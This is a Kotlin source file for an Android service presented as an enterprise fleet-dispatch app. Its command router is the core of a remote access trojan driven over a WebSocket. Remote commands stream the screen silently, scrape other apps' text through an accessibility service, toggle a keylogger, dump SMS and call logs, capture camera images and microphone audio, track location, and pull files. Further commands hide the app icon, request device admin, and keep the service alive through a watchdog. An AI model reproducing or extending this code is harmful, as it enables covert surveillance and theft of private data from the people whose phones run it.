// [context: enterprise fleet dispatch app, Android API 26+, ARM64/any — foreground WebSocket command bus]
// MainService.kt — central command dispatcher + todos os módulos wired
package com.fleetdroid.driver.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.ServiceInfo
import android.hardware.camera2.CameraCharacteristics
import android.os.BatteryManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.Looper
import android.os.Parcel
import android.util.Base64
import android.util.Log
import com.corp.mdm.inventory.DeviceProfiler
import com.empresa.realtime.WebSocketClient
import com.fleetdroid.driver.HwidUtil
import com.fleetdroid.mdm.capture.ScreenCaptureModule
import com.securesdk.storage.SecureConfig
import com.temu.shopassist.service.AppAccessibilityService
import org.json.JSONObject
import java.nio.ByteBuffer
import java.nio.ByteOrder

// ── FrameSink: contrato que qualquer módulo de captura implementa ─────────
interface FrameSink {
    fun pushFrame(width: Int, height: Int, jpegBytes: ByteArray, timestampMs: Long)
    fun pushError(reason: String)
}

class DispatchService : Service() {

    private lateinit var prefs: SharedPreferences
    @Volatile private var ws: WebSocketClient? = null
    private lateinit var cfg: SecureConfig

    private val mainHandler = Handler(Looper.getMainLooper())

    // ── Screen capture ──────────────────────────────────────────────────────
    private val screenCapture by lazy { ScreenCaptureModule(this) }
    private val frameThread = HandlerThread("frame-worker")
    private lateinit var frameHandler: Handler

    @Volatile private var maxFps: Int = 15
    @Volatile private var lastFrameMs: Long = 0L

    private var unitId: String = ""

    // ── FrameSink → WS binary ───────────────────────────────────────────────
    private val frameSink = object : FrameSink {
        override fun pushFrame(width: Int, height: Int, jpegBytes: ByteArray, timestampMs: Long) {
            frameHandler.post {
                val now = System.currentTimeMillis()
                val minInterval = 1000L / maxFps.coerceAtLeast(1)
                if (now - lastFrameMs < minInterval) return@post
                val pkt = ByteBuffer.allocate(8 + jpegBytes.size)
                    .order(ByteOrder.BIG_ENDIAN)
                    .putInt(width).putInt(height).put(jpegBytes).array()
                try { ws?.sendBinary(pkt); lastFrameMs = now } catch (e: Exception) {
                    Log.e(TAG, "frame send failed", e)
                }
            }
        }
        override fun pushError(reason: String) {
            Log.e(TAG, "capture error: $reason")
            try { ws?.send("""{"type":"capture_error","msg":"${reason.replace("\"","\\\"" )}"}""") } catch (_: Exception) {}
            stopCapture()
        }
    }

    private val captureCallback = object : ScreenCaptureModule.FrameCallback {
        override fun onFrame(jpegBytes: ByteArray, width: Int, height: Int, timestampMs: Long) =
            frameSink.pushFrame(width, height, jpegBytes, timestampMs)
        override fun onError(reason: String) = frameSink.pushError(reason)
    }

    // ── WS listener ────────────────────────────────────────────────────────
    private val wsListener = object : WebSocketClient.MessageListener {
        override fun onConnected() {
            Log.i(TAG, "ws connected")
            ws?.send(JSONObject().apply {
                put("type",         "hello")
                put("client_id",    unitId)
                put("model",        Build.MODEL)
                put("sdk_int",      Build.VERSION.SDK_INT)
                put("manufacturer", Build.MANUFACTURER)
                put("android_ver",  Build.VERSION.RELEASE)
                put("hwid",         HwidUtil.generate(applicationContext))
                put("battery",      batteryLevel())
                put("ts",           System.currentTimeMillis())
            }.toString())
        }
        override fun onMessage(data: String) {
            try {
                val obj = JSONObject(data)
                val cmd = obj.optString("cmd", "")
                if (cmd.isBlank()) { Log.w(TAG, "no cmd: $data"); return }
                routeCommand(cmd, obj.optJSONObject("payload") ?: JSONObject())
            } catch (e: Exception) { Log.e(TAG, "parse error: $data", e) }
        }
        override fun onDisconnected(reason: String) { Log.i(TAG, "ws disconnected: $reason") }
        override fun onError(error: Exception) { Log.e(TAG, "ws error", error) }
    }

    // ── Lifecycle ───────────────────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        instance = this
        startForeground(NOTIF_ID, buildNotification())

        cfg   = SecureConfig.getInstance(this)
        prefs = getSharedPreferences("fleet_prefs", Context.MODE_PRIVATE)

        val wsUrl  = cfg.getString("server_url").ifBlank { prefs.getString("ws_url", "").orEmpty() }
        unitId     = cfg.getString("client_id").ifBlank { prefs.getString("unit_id", "").orEmpty() }

        if (wsUrl.isBlank() || unitId.isBlank()) {
            Log.e(TAG, "missing config — aborting")
            stopSelf(); return
        }

        frameThread.start()
        frameHandler = Handler(frameThread.looper)

        // Agenda watchdog para ressurreição automática
        WatchdogReceiver.schedule(this)

        Thread {
            var token = cfg.getString("auth_token")
            val deadline = System.currentTimeMillis() + 15_000L
            while (token.isBlank() && System.currentTimeMillis() < deadline) {
                Thread.sleep(500); token = cfg.getString("auth_token")
            }
            if (token.isBlank()) { Log.e(TAG, "auth_token blank after 15s — aborting"); stopSelf(); return@Thread }
            val client = WebSocketClient(wsUrl, unitId, token, wsListener)
            ws = client; client.connect()
        }.also { it.isDaemon = true }.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "STOP") { stopSelf() }
        return START_STICKY
    }

    override fun onDestroy() {
        stopCapture()
        LocationModule.stopTracking()
        MicModule.stopRecording()
        frameThread.quitSafely()
        ws?.disconnect()
        mainHandler.removeCallbacksAndMessages(null)
        stopForeground(true)
        instance = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ── sendWs helper — usado pelos módulos para enviar dados ───────────────
    fun sendWs(json: String) {
        try { ws?.send(json) } catch (e: Exception) { Log.e(TAG, "sendWs failed", e) }
    }

    // ── Command router ─────────────────────────────────────────────────────
    private fun routeCommand(cmd: String, payload: JSONObject) {
        Log.d(TAG, "cmd: $cmd")
        when (cmd) {

            // ── Status & config ────────────────────────────────────────────
            "status_report"  -> sendStatus()
            "config_update"  -> applyConfig(payload)
            "acknowledge"    -> sendWs("""{"type":"ack","ts":${System.currentTimeMillis()}}""")
            "device_profile" -> {
                try {
                    val p = DeviceProfiler(applicationContext)
                    sendWs("""{"type":"device_profile","client_id":"$unitId","data":${p.toJson(p.collect())}}""")
                } catch (e: Exception) { sendWs("""{"type":"error","msg":"device_profile: ${e.message}"}""") }
            }

            // ── Screen capture ─────────────────────────────────────────────
            "screen_live" -> {
                maxFps = payload.optInt("fps", 15).coerceIn(1, 30)
                startCapture(payload, maxFps, payload.optInt("quality", 60))
            }
            "screen_silent" -> {
                maxFps = payload.optInt("fps", 2).coerceIn(1, 5)
                startCapture(payload, maxFps, payload.optInt("quality", 30))
            }
            "screen_stop"   -> stopCapture()
            "screen_params" -> {
                maxFps = payload.optInt("fps", maxFps).coerceIn(1, 30)
                screenCapture.setMaxFps(maxFps)
                screenCapture.setQuality(payload.optInt("quality", 60))
            }

            // ── UI skeleton (AccessibilityService) ─────────────────────────
            "screen_skeleton" -> {
                val text = AppAccessibilityService.getAllNodesText()
                sendWs(JSONObject().apply {
                    put("type", "skeleton_data"); put("client_id", unitId)
                    put("content", text); put("ts", System.currentTimeMillis())
                }.toString())
            }

            // ── Keylogger toggle ───────────────────────────────────────────
            "keylog_start" -> {
                sendWs("""{"type":"keylog_status","active":${AppAccessibilityService.instance != null}}""")
            }
            "keylog_stop" -> {
                sendWs("""{"type":"keylog_status","active":false}""")
            }

            // ── Skeleton live stream ───────────────────────────────────────
            "skeleton_live_start" -> {
                AppAccessibilityService.skeletonLive = true
                val text = AppAccessibilityService.getAllNodesText()
                sendWs(JSONObject().apply {
                    put("type",    "skeleton")
                    put("pkg",     "")
                    put("app",     "")
                    put("content", text)
                    put("ts",      System.currentTimeMillis())
                }.toString())
                sendWs("""{"type":"skeleton_live_status","active":true}""")
            }
            "skeleton_live_stop" -> {
                AppAccessibilityService.skeletonLive = false
                sendWs("""{"type":"skeleton_live_status","active":false}""")
            }

            // ── SMS ────────────────────────────────────────────────────────
            "sms_dump" -> {
                val limit = payload.optInt("limit", 200)
                Thread { SmsModule.sendDump(applicationContext, limit) }.also { it.isDaemon = true }.start()
            }

            // ── Call log ───────────────────────────────────────────────────
            "call_log_dump" -> {
                val limit = payload.optInt("limit", 100)
                Thread { CallLogModule.sendDump(applicationContext, limit) }.also { it.isDaemon = true }.start()
            }

            // ── Camera ─────────────────────────────────────────────────────
            "camera_front" -> {
                val quality = payload.optInt("quality", 80)
                Thread { CameraModule.capture(applicationContext, CameraCharacteristics.LENS_FACING_FRONT, quality) }.also { it.isDaemon = true }.start()
            }
            "camera_back" -> {
                val quality = payload.optInt("quality", 80)
                Thread { CameraModule.capture(applicationContext, CameraCharacteristics.LENS_FACING_BACK, quality) }.also { it.isDaemon = true }.start()
            }

            // ── Mic ────────────────────────────────────────────────────────
            "mic_start" -> {
                val dur = payload.optInt("duration", 30)
                mainHandler.post { MicModule.startRecording(applicationContext, dur) }
            }
            "mic_stop" -> {
                mainHandler.post { MicModule.stopRecording() }
            }

            // ── Location ───────────────────────────────────────────────────
            "location_get" -> {
                mainHandler.post { LocationModule.getOnce(applicationContext) }
            }
            "location_track_start" -> {
                val interval = payload.optLong("interval_ms", 30_000L)
                mainHandler.post { LocationModule.startTracking(applicationContext, interval) }
            }
            "location_track_stop" -> {
                mainHandler.post { LocationModule.stopTracking() }
            }

            // ── File manager ───────────────────────────────────────────────
            "file_ls" -> {
                val path = payload.optString("path", "/sdcard")
                Thread { FileModule.listDir(path) }.also { it.isDaemon = true }.start()
            }
            "file_pull" -> {
                val path = payload.optString("path", "")
                if (path.isNotBlank()) {
                    Thread { FileModule.pullFile(path) }.also { it.isDaemon = true }.start()
                } else {
                    sendWs("""{"type":"error","msg":"file_pull: path required"}""")
                }
            }
            "file_search" -> {
                val root = payload.optString("root", "/sdcard")
                val exts = payload.optString("extensions", "").split(",")
                    .map { it.trim() }.filter { it.isNotBlank() }
                val limit = payload.optInt("limit", 200)
                Thread { FileModule.search(root, exts, limit) }.also { it.isDaemon = true }.start()
            }

            // ── Stealth / persistence ──────────────────────────────────────
            "hide_icon"            -> StealthModule.hideIcon(applicationContext)
            "show_icon"            -> StealthModule.showIcon(applicationContext)
            "request_device_admin" -> mainHandler.post { StealthModule.requestDeviceAdmin(applicationContext) }

            else -> Log.w(TAG, "unhandled cmd: $cmd")
        }
    }

    // ── Screen capture helpers ──────────────────────────────────────────────

    private fun startCapture(payload: JSONObject, fps: Int, quality: Int) {
        val b64 = payload.optString("projection_b64", "")
            .ifBlank { cfg.getString("projection_intent_b64") }
        if (b64.isBlank()) { sendWs("""{"type":"capture_error","msg":"no projection intent"}"""); return }
        val bytes = try { Base64.decode(b64, Base64.NO_WRAP) } catch (e: Exception) {
            sendWs("""{"type":"capture_error","msg":"bad base64: ${e.message}"}"""); return
        }
        val intent = try {
            val parcel = Parcel.obtain()
            parcel.unmarshall(bytes, 0, bytes.size); parcel.setDataPosition(0)
            @Suppress("DEPRECATION") val i = parcel.readParcelable<Intent>(Intent::class.java.classLoader)
            parcel.recycle(); i ?: throw IllegalStateException("null intent")
        } catch (e: Exception) { sendWs("""{"type":"capture_error","msg":"parcel: ${e.message}"}"""); return }

        mainHandler.post {
            screenCapture.setQuality(quality); screenCapture.setMaxFps(fps)
            if (screenCapture.start(intent, captureCallback)) {
                sendWs("""{"type":"capture_started","fps":$fps,"quality":$quality}""")
            } else {
                sendWs("""{"type":"capture_error","msg":"start() returned false"}""")
            }
        }
    }

    private fun stopCapture() {
        mainHandler.post {
            if (screenCapture.isRunning()) {
                screenCapture.stop()
                try { sendWs("""{"type":"capture_stopped"}""") } catch (_: Exception) {}
            }
        }
    }

    private fun sendStatus() {
        sendWs(JSONObject().apply {
            put("type",         "status")
            put("unit_id",      unitId)
            put("model",        Build.MODEL)
            put("api",          Build.VERSION.SDK_INT)
            put("ts",           System.currentTimeMillis())
            put("battery",      batteryLevel())
            put("mic_active",   MicModule.isRecording())
            put("loc_tracking", LocationModule.isTracking())
            put("screen_cap",   screenCapture.isRunning())
            put("accessibility",AppAccessibilityService.instance != null)
            put("notif_listen", FleetNotifListener.instance != null)
        }.toString())
    }

    private fun applyConfig(payload: JSONObject) {
        val editor = prefs.edit()
        if (payload.has("log_level"))          editor.putInt("log_level", payload.optInt("log_level"))
        if (payload.has("report_interval_ms")) editor.putLong("report_interval_ms", payload.optLong("report_interval_ms"))
        if (payload.has("server_url")) {
            val url = payload.optString("server_url")
            if (url.isNotBlank()) cfg.putString("server_url", url)
        }
        editor.apply()
        sendWs("""{"type":"config_updated","ts":${System.currentTimeMillis()}}""")
    }

    private fun batteryLevel(): Int {
        val bm = getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
        return bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
    }

    private fun buildNotification(): Notification {
        val channelId = "fleet_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(NotificationChannel(
                channelId, "Fleet Operations", NotificationManager.IMPORTANCE_LOW
            ).apply { setSound(null, null); enableVibration(false) })
        }
        return Notification.Builder(this, channelId)
            .setContentTitle("Fleet Operations")
            .setContentText("Connected to dispatch")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setOnlyAlertOnce(true).setOngoing(true).build()
    }

    private fun startForeground(id: Int, notification: Notification) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                       ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            startForeground(id, notification, type)
        } else { super.startForeground(id, notification) }
    }

    companion object {
        const val TAG = "DispatchService"
        const val NOTIF_ID = 1001
        @Volatile var instance: DispatchService? = null
    }
}
